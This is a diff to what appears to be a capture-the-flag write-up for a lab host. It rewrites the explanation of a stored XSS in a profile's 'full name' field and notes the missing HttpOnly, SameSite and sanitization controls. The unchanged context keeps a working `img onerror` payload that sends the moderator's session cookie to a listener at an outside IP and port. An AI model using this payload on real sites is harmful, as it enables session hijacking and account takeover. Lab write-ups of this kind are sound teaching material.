@@ -57,10 +57,16 @@ http://worldwap.thm/public/html/
 
 ## 2. 💣 Initial XSS Payload — Cookie Exfiltration
 
-During the registration process a stored XSS vector was discovered. The payload is stored inside the user profile field ("full name") which is later rendered on the moderator's dashboard. Because this field is displayed without any output encoding, the payload executes whenever a privileged user views the affected profile.
+### Why the XSS Worked
 
-Injecting an `img onerror` payload allowed JavaScript execution inside the victim’s browser:
+The “full name” field is rendered directly into the DOM without any output encoding.  
+Additionally, the application does not apply the following protections:
 
+- No `HttpOnly` flag on `PHPSESSID` → allows JavaScript access  
+- No `SameSite` attribute → browser freely forwards cookies to external requests  
+- No input sanitization or HTML stripping  
+
+These missing controls allowed a simple `<img onerror>` payload to execute inside the moderator’s browser when they viewed the profile.
 ```html
 <img src=x onerror="window.location='http://10.10.181.194:4444?'+document.cookie;">
 ```
